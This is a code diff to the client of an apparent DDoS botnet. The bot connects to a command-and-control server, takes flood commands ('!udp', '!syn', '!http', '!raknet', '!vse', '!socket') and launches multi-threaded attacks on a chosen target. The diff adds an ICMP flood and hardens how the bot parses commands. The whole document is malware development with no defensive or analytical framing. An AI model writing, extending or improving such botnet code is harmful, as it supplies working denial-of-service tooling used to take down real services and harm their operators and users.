@@ -9,14 +9,15 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <time.h>
-#include "syn_attack.h"
-#include "udp_attack.h"
-#include "http_attack.h"
-#include "socket_attack.h"
-#include "vse_attack.h"
-#include "raknet_attack.h"
-#include "attack_params.h"
-#include "daemon.h"
+#include "headers/syn_attack.h"
+#include "headers/udp_attack.h"
+#include "headers/http_attack.h"
+#include "headers/socket_attack.h"
+#include "headers/vse_attack.h"
+#include "headers/raknet_attack.h"
+#include "headers/attack_params.h"
+#include "headers/daemon.h"
+#include "headers/icmp_attack.h"
 
 #define CNC_IP "0.0.0.0"
 #define BOT_PORT 1338
@@ -51,21 +52,26 @@ const char* get_arch() {
 void handle_command(const char *command, int sock) {
     static attack_params* params = NULL;
     static pthread_t threads[MAX_THREADS];
-    const char* arch = get_arch();
+
+    if (!command || strlen(command) > 1023) return;
+    for (size_t i = 0; i < strlen(command); i++) {
+        if ((unsigned char)command[i] < 0x09 || ((unsigned char)command[i] > 0x0D && (unsigned char)command[i] < 0x20) || (unsigned char)command[i] > 0x7E) {
+            return;
+        }
+    }
 
     if (strcmp(command, "ping") == 0) {
         char buffer[256];
-        snprintf(buffer, sizeof(buffer), "pong %s", arch);
+        snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
         send(sock, buffer, strlen(buffer), 0);
         return;
     }
 
-    // Supported attacks
     int is_attack = 0;
-    const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet"};
-    int method_len[] = {4, 4, 4, 7, 5, 7};
+    const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp"};
+    int method_len[] = {4, 4, 4, 7, 5, 7, 5};
     int which = -1;
-    for (int i = 0; i < 6; i++) {
+    for (int i = 0; i < 7; i++) {
         if (strncmp(command, methods[i], method_len[i]) == 0) {
             is_attack = 1;
             which = i;
@@ -78,14 +84,17 @@ void handle_command(const char *command, int sock) {
         int port = 0, time = 0;
         int psize = 0, srcport = 0;
         char argstr[512] = {0};
+        int n;
 
-        // Parse command and optional arguments
-        int n = sscanf(command, "%*s %31s %d %d %[^\n]", ip, &port, &time, argstr);
+        if (which == 6) {
+            n = sscanf(command, "%*s %31s %d %[^\n]", ip, &time, argstr);
+            if (n < 2) return;
+        } else {
+            n = sscanf(command, "%*s %31s %d %d %[^\n]", ip, &port, &time, argstr);
+            if (n < 3) return;
+        }
 
-        if (n < 3) return; // Not enough arguments
-
-        // Parse optional arguments
-        if (n == 4 && strlen(argstr) > 0) {
+        if (strlen(argstr) > 0) {
             char *token = strtok(argstr, " ");
             while (token) {
                 if (strncmp(token, "psize=", 6) == 0) {
@@ -97,34 +106,36 @@ void handle_command(const char *command, int sock) {
             }
         }
 
-        if (params != NULL) {
+        if (params) {
             params->active = 0;
             for (int i = 0; i < MAX_THREADS; i++) {
-                pthread_cancel(threads[i]);
+                pthread_join(threads[i], NULL);
             }
             free(params);
+            params = NULL;
         }
+
         params = malloc(sizeof(attack_params));
-        memset(params, 0, sizeof(attack_params));
-        params->target_addr.sin_family = AF_INET;
-        params->target_addr.sin_port = htons(port);
-        inet_pton(AF_INET, ip, &params->target_addr.sin_addr);
-        params->duration = time;
+        if (!params) return;
+
         params->active = 1;
+        params->duration = time;
+        params->target_addr.sin_family = AF_INET;
+        params->target_addr.sin_addr.s_addr = inet_addr(ip);
+        params->target_addr.sin_port = htons(port);
         params->psize = psize;
         params->srcport = srcport;
 
-        void* (*attack_func)(void*) = NULL;
-        switch (which) {
-            case 0: attack_func = udp_attack; break;
-            case 1: attack_func = vse_attack; break;
-            case 2: attack_func = syn_attack; break;
-            case 3: attack_func = socket_attack; break;
-            case 4: attack_func = http_attack; break;
-            case 5: attack_func = raknet_attack; break;
-        }
         for (int i = 0; i < MAX_THREADS; i++) {
-            pthread_create(&threads[i], NULL, attack_func, params);
+            switch (which) {
+                case 0: pthread_create(&threads[i], NULL, udp_attack, params); break;
+                case 1: pthread_create(&threads[i], NULL, vse_attack, params); break;
+                case 2: pthread_create(&threads[i], NULL, syn_attack, params); break;
+                case 3: pthread_create(&threads[i], NULL, socket_attack, params); break;
+                case 4: pthread_create(&threads[i], NULL, http_attack, params); break;
+                case 5: pthread_create(&threads[i], NULL, raknet_attack, params); break;
+                case 6: pthread_create(&threads[i], NULL, icmp_attack, params); break;
+            }
         }
         sleep(time);
         params->active = 0;
@@ -183,13 +194,28 @@ int main(int argc, char** argv) {
             continue;
         }
 
+        const char* arch = get_arch();
+        send(sock, arch, strlen(arch), 0);
+
         attempts = 0;
 
         char buffer[1024];
         while (1) {
             memset(buffer, 0, sizeof(buffer));
-            int len = recv(sock, buffer, sizeof(buffer), 0);
+            int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
             if (len <= 0) {
+                close(sock);
+                break;
+            }
+            buffer[len] = 0;
+            int valid = 1;
+            for (int i = 0; i < len; i++) {
+                if ((unsigned char)buffer[i] < 0x09 || ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || (unsigned char)buffer[i] > 0x7E) {
+                    valid = 0;
+                    break;
+                }
+            }
+            if (!valid) {
                 close(sock);
                 break;
             }
